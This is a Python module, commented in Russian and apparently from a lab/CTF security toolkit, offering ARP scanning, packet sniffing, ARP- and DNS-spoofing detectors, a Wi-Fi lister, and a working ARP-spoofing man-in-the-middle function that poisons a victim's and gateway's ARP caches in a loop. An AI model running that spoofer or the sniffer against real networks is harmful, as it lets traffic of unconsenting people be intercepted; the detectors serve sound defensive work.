"""
Модуль сетевых атак и анализа (только для лабораторий/CTF).
Требует прав root / CAP_NET_RAW для работы со scapy.
"""
import sys
import time
import subprocess
import socket
from rich.console import Console
from rich.prompt import Prompt, IntPrompt, Confirm
from rich.table import Table

from core.database import db
from core.logger import get_logger
from utils.helpers import confirm_external

console = Console()
log = get_logger(__name__)

try:
    from scapy.all import (
        ARP, Ether, srp, sniff, IP, TCP, UDP, ICMP, DNS, DNSQR, DNSRR,
        get_if_list, get_if_hwaddr, sendp, wrpcap, conf,
    )
    SCAPY_OK = True
    SCAPY_ERR = ""
except Exception as exc:  # noqa: BLE001
    SCAPY_OK = False
    SCAPY_ERR = str(exc)
    log.warning("scapy недоступен: %s", exc)


def _require_scapy() -> bool:
    """Проверить наличие scapy."""
    if not SCAPY_OK:
        console.print(f"[red]scapy недоступен: {SCAPY_ERR}[/red]")
        console.print("[yellow]Установи: pip install scapy, запусти от root "
                      "(или setcap cap_net_raw,cap_net_admin).[/yellow]")
        return False
    return True


def list_interfaces() -> None:
    """Показать доступные сетевые интерфейсы."""
    if not _require_scapy():
        return
    table = Table(title="Сетевые интерфейсы")
    table.add_column("Имя", style="cyan")
    table.add_column("MAC", style="green")
    for iface in get_if_list():
        try:
            mac = get_if_hwaddr(iface)
        except Exception:  # noqa: BLE001
            mac = "—"
        table.add_row(iface, mac)
    console.print(table)


def arp_scan(interface: str | None = None, network: str | None = None) -> None:
    """
    ARP-скан устройств в локальной сети.
    network пример: 192.168.1.0/24
    """
    if not _require_scapy():
        return
    if not network:
        network = Prompt.ask("Подсеть (CIDR)", default="192.168.1.0/24")
    if not Confirm.ask(
        f"[yellow]ARP-скан {network}. Подтверждаешь, что это твоя сеть?[/yellow]",
        default=False,
    ):
        return

    console.print(f"[cyan]ARP-скан {network}...[/cyan]")
    try:
        arp = ARP(pdst=network)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp
        result = srp(packet, timeout=3, iface=interface, verbose=False)[0]
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]Ошибка ARP-скана: {exc}[/red]")
        log.exception("ARP scan error")
        return

    table = Table(title=f"Устройства в {network}")
    table.add_column("IP", style="cyan")
    table.add_column("MAC", style="green")
    found: list[dict] = []
    for _, rcv in result:
        entry = {"ip": rcv.psrc, "mac": rcv.hwsrc}
        found.append(entry)
        table.add_row(entry["ip"], entry["mac"])
    console.print(table)
    if not found:
        console.print("[yellow]Ничего не найдено.[/yellow]")
    db.save_scan("arp_scan", network, found)


def packet_sniffer(
    interface: str | None = None,
    count: int = 50,
    out_pcap: str | None = None,
) -> None:
    """Простой сниффер пакетов (scapy)."""
    if not _require_scapy():
        return
    if not Confirm.ask(
        "[yellow]Сниффинг трафика в твоей сети. Подтверждаешь?[/yellow]",
        default=False,
    ):
        return

    console.print(
        f"[cyan]Слушаю интерфейс {interface or 'default'}, "
        f"максимум {count} пакетов...[/cyan]"
    )
    captured: list = []

    def _handle(pkt) -> None:
        captured.append(pkt)
        if pkt.haslayer(IP):
            src = pkt[IP].src
            dst = pkt[IP].dst
            proto = {6: "TCP", 17: "UDP", 1: "ICMP"}.get(pkt[IP].proto, str(pkt[IP].proto))
            extra = ""
            if pkt.haslayer(TCP):
                extra = f" {pkt[TCP].sport}->{pkt[TCP].dport}"
            elif pkt.haslayer(UDP):
                extra = f" {pkt[UDP].sport}->{pkt[UDP].dport}"
            console.print(
                f"[green]{src:>16}[/green] → "
                f"[magenta]{dst:<16}[/magenta] "
                f"[cyan]{proto}[/cyan]{extra}"
            )

    try:
        sniff(iface=interface, prn=_handle, count=count, store=False, timeout=30)
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]Ошибка сниффинга: {exc}[/red]")
        return

    if out_pcap and captured:
        try:
            wrpcap(out_pcap, captured)
            console.print(f"[green]✓ Сохранено: {out_pcap}[/green]")
        except Exception as exc:  # noqa: BLE001
            console.print(f"[red]Ошибка записи PCAP: {exc}[/red]")
    db.save_scan(
        "sniffer",
        interface or "default",
        {"count": len(captured), "pcap": out_pcap},
    )


def mitm_detector(interface: str | None = None, duration: int = 20) -> None:
    """
    Детектор MITM: ловим дублирующиеся MAC для одного IP
    (признак ARP-спуфинга).
    """
    if not _require_scapy():
        return
    console.print(f"[cyan]Слежу за ARP {duration} сек...[/cyan]")
    ip_mac: dict[str, set[str]] = {}

    def _handle(pkt) -> None:
        if pkt.haslayer(ARP) and pkt[ARP].op in (1, 2):
            ip = pkt[ARP].psrc
            mac = pkt[ARP].hwsrc
            ip_mac.setdefault(ip, set()).add(mac)

    try:
        sniff(iface=interface, filter="arp", prn=_handle, store=False, timeout=duration)
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]Ошибка: {exc}[/red]")
        return

    alerts = {ip: macs for ip, macs in ip_mac.items() if len(macs) > 1}
    if alerts:
        console.print("[red]⚠ Возможен ARP-спуфинг (MITM):[/red]")
        for ip, macs in alerts.items():
            console.print(f"  [yellow]{ip}[/yellow] → {', '.join(macs)}")
    else:
        console.print("[green]Подозрений на MITM не найдено.[/green]")
    db.save_scan(
        "mitm_detect",
        interface or "default",
        {"alerts": {k: list(v) for k, v in alerts.items()}},
    )


def dns_spoof_detector(interface: str | None = None, duration: int = 20) -> None:
    """
    Детектор DNS-спуфинга: ловим ответы с подозрительно малым TTL
    или дублирующиеся ответы на один и тот же запрос.
    """
    if not _require_scapy():
        return
    console.print(f"[cyan]Слежу за DNS {duration} сек...[/cyan]")
    susp: list[dict] = []

    def _handle(pkt) -> None:
        if pkt.haslayer(DNS) and pkt[DNS].qr == 1:
            try:
                qname = pkt[DNS].qd.qname.decode(errors="ignore")
                an = pkt[DNS].ancount
                rr = pkt[DNS].an
                rdata = ""
                ttl = None
                if rr is not None:
                    if hasattr(rr, "rdata"):
                        rdata = str(rr.rdata)
                    if hasattr(rr, "ttl"):
                        ttl = int(rr.ttl)
                if ttl is not None and ttl < 5:
                    entry = {
                        "q": qname,
                        "rdata": rdata,
                        "ttl": ttl,
                        "answers": an,
                    }
                    susp.append(entry)
                    console.print(
                        f"[red]⚠ Подозрительный DNS: {qname} → "
                        f"{rdata} (TTL={ttl})[/red]"
                    )
            except Exception:  # noqa: BLE001
                pass

    try:
        sniff(iface=interface, filter="udp port 53", prn=_handle,
              store=False, timeout=duration)
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]Ошибка: {exc}[/red]")
        return

    if not susp:
        console.print("[green]Подозрительных DNS-ответов нет.[/green]")
    db.save_scan("dns_spoof", interface or "default", susp)


def _wifi_windows() -> list[dict]:
    """Список Wi-Fi сетей на Windows через netsh."""
    try:
        out = subprocess.check_output(
            ["netsh", "wlan", "show", "networks", "mode=Bssid"],
            encoding="cp866", errors="ignore",
        )
    except Exception:  # noqa: BLE001
        return []
    networks: list[dict] = []
    current: dict = {}
    for line in out.splitlines():
        line = line.strip()
        if line.startswith("SSID ") and "BSSID" not in line:
            if current:
                networks.append(current)
            current = {"ssid": line.split(":", 1)[-1].strip()}
        elif "Authentication" in line:
            current["auth"] = line.split(":", 1)[-1].strip()
        elif "Signal" in line:
            current["signal"] = line.split(":", 1)[-1].strip()
    if current:
        networks.append(current)
    return networks


def _wifi_linux() -> list[dict]:
    """Список Wi-Fi сетей на Linux через nmcli."""
    try:
        out = subprocess.check_output(
            ["nmcli", "-t", "-f", "SSID,SIGNAL,SECURITY", "dev", "wifi", "list"],
            encoding="utf-8", errors="ignore",
        )
    except Exception:  # noqa: BLE001
        return []
    networks: list[dict] = []
    for line in out.splitlines():
        parts = line.split(":")
        if len(parts) >= 3:
            networks.append({
                "ssid": parts[0],
                "signal": parts[1],
                "auth": parts[2],
            })
    return networks


def wifi_analyzer() -> None:
    """Список Wi-Fi сетей + тип шифрования (Windows/Linux)."""
    if sys.platform.startswith("win"):
        networks = _wifi_windows()
    else:
        networks = _wifi_linux()
    if not networks:
        console.print(
            "[red]Не удалось получить список Wi-Fi "
            "(нет nmcli/netsh или нет адаптера).[/red]"
        )
        return
    table = Table(title="Wi-Fi сети")
    table.add_column("SSID", style="cyan")
    table.add_column("Signal", style="green")
    table.add_column("Auth", style="magenta")
    for n in networks:
        table.add_row(
            str(n.get("ssid", "?")),
            str(n.get("signal", "?")),
            str(n.get("auth", "?")),
        )
    console.print(table)
    db.save_scan("wifi", "local", networks)


def _get_mac(ip: str) -> str:
    """Получить MAC по IP через ARP-запрос."""
    if not _require_scapy():
        raise RuntimeError("scapy недоступен")
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                 timeout=3, verbose=False)
    if not ans:
        raise RuntimeError(f"MAC для {ip} не найден")
    return ans[0][1].hwsrc


def mitm_simulator(
    interface: str | None = None,
    target_ip: str | None = None,
    gateway_ip: str | None = None,
) -> None:
    """
    ⚠ Симулятор MITM (ARP-спуфинг) — ТОЛЬКО для своей лабораторной сети.
    Отправляет поддельные ARP-ответы жертве и шлюзу.
    """
    if not _require_scapy():
        return
    console.print(
        "[bold red]⚠ MITM-симулятор. "
        "Использовать только в изолированной лаборатории![/bold red]"
    )
    if not Confirm.ask(
        "Подтверждаешь, что сеть твоя и разрешение у тебя есть?",
        default=False,
    ):
        return
    target_ip = target_ip or Prompt.ask("IP жертвы")
    gateway_ip = gateway_ip or Prompt.ask("IP шлюза")

    try:
        target_mac = _get_mac(target_ip)
        gateway_mac = _get_mac(gateway_ip)
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]Не удалось получить MAC: {exc}[/red]")
        return

    console.print(
        f"[cyan]Цель: {target_ip} ({target_mac}) | "
        f"Шлюз: {gateway_ip} ({gateway_mac})[/cyan]"
    )
    console.print("[yellow]Ctrl+C для остановки и восстановления ARP.[/yellow]")
    try:
        while True:
            sendp(
                Ether(dst=target_mac) / ARP(
                    op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip,
                ),
                iface=interface, verbose=False,
            )
            sendp(
                Ether(dst=gateway_mac) / ARP(
                    op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip,
                ),
                iface=interface, verbose=False,
            )
            time.sleep(1.5)
    except KeyboardInterrupt:
        console.print("\n[yellow]Восстанавливаю ARP-таблицы...[/yellow]")
        for _ in range(5):
            sendp(
                Ether(dst=target_mac) / ARP(
                    op=2, pdst=target_ip, hwdst=target_mac,
                    psrc=gateway_ip, hwsrc=gateway_mac,
                ),
                iface=interface, verbose=False,
            )
            sendp(
                Ether(dst=gateway_mac) / ARP(
                    op=2, pdst=gateway_ip, hwdst=gateway_mac,
                    psrc=target_ip, hwsrc=target_mac,
                ),
                iface=interface, verbose=False,
            )
        console.print("[green]✓ ARP-таблицы восстановлены.[/green]")
    db.save_scan(
        "mitm_sim",
        f"{target_ip}|{gateway_ip}",
        {"interface": interface},
    )


def menu() -> None:
    """Меню сетевого модуля."""
    table = Table(title="[bold]Network[/bold]")
    table.add_column("№", style="yellow")
    table.add_column("Опция")
    opts = [
        ("1", "Список интерфейсов"),
        ("2", "ARP-скан сети"),
        ("3", "Packet sniffer"),
        ("4", "MITM detector (ARP-спуфинг)"),
        ("5", "DNS spoof detector"),
        ("6", "Wi-Fi analyzer"),
        ("7", "MITM simulator (ARP-спуфинг, CTF)"),
    ]
    for n, t in opts:
        table.add_row(n, t)
    console.print(table)
    c = Prompt.ask("Выбор", choices=[o[0] for o in opts])
    if c == "1":
        list_interfaces()
    elif c == "2":
        arp_scan()
    elif c == "3":
        cnt = IntPrompt.ask("Сколько пакетов", default=50)
        pcap = Prompt.ask("Сохранить в PCAP? (имя файла или пусто)", default="")
        packet_sniffer(count=cnt, out_pcap=pcap or None)
    elif c == "4":
        dur = IntPrompt.ask("Длительность (сек)", default=20)
        mitm_detector(duration=dur)
    elif c == "5":
        dur = IntPrompt.ask("Длительность (сек)", default=20)
        dns_spoof_detector(duration=dur)
    elif c == "6":
        wifi_analyzer()
    elif c == "7":
        mitm_simulator()